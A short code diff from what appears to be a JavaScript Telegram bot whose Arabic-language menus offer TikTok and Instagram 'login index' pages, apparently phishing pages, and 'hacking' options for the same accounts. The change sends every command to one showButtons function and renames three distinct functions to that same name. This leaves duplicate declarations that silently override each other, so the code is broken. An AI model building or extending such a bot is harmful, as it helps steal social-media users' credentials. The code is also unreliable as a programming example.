@@ -769,11 +769,11 @@ bot.on('message', async (msg) => {
   const senderId = msg.from.id;
 
   if (text === '/start') {
-    showDefaultButtons(senderId);
+    showButtons(senderId);
   } else if (text === '/login') {
-    showLoginButtons(senderId);
+    showButtons(senderId);
   } else if (text === '/hacking') {
-    showHackingButtons(senderId);
+    showButtons(senderId);
   }
 });
 
@@ -797,7 +797,7 @@ function showDefaultButtons(userId) {
   });
 }
 
-function showLoginButtons(userId) {
+function showButtons(userId) {
   let loginButtons = [
     [{ text: ' 🎵اندكس تسجيل دخول تيك توك 🎵 ', callback_data: 'login_tiktok' }],
     [{ text: ' 📸اندكس تسجيل دخول انستقرام 📸', callback_data: 'login_instagram' }],
@@ -813,7 +813,7 @@ function showLoginButtons(userId) {
   });
 }
 
-function showHackingButtons(userId) {
+function showButtons(userId) {
   let hackingButtons = [
     [{ text: '☠️ اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
     [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
